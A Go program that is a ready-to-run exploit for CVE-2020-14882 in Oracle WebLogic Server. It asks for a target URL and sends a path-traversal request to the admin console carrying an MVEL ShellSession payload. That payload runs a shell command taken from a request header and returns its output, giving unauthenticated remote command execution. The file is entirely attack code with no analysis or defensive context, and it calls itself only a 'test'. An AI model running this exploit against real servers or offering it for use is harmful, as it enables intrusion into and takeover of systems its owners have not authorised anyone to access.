package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
)

func main() {
	fmt.Println("[*] CVE-2020-14882 test starting")

	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input url: ")
	url1, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}
	payload1 := `_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ")`
	path := `/console/css/%252e%252e%252fconsole.portal?` + payload1
	url2 := string(url1) + path

	var client http.Client

	req1, err := http.NewRequest("GET", url2, nil)
	if err != nil {
		panic(err)
	}
	reader2 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input command: ")
	commond, _, err := reader2.ReadLine()
	if err != nil {
		panic(err)
	}

	command := url.QueryEscape(string(commond))

	req1.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36")
	req1.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req1.Header.Add("Accept-Encoding", "gzip, deflate")
	req1.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
	req1.Header.Add("Connection", "close")
	req1.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req1.Header.Add("cmd", command)

	rep1, err := client.Do(req1)
	if err != nil {
		panic(err)
	}
	body1, _ := ioutil.ReadAll(rep1.Body)
	// if err != nil {
	// 	panic(err)
	// }

	fmt.Println(string(body1))
}
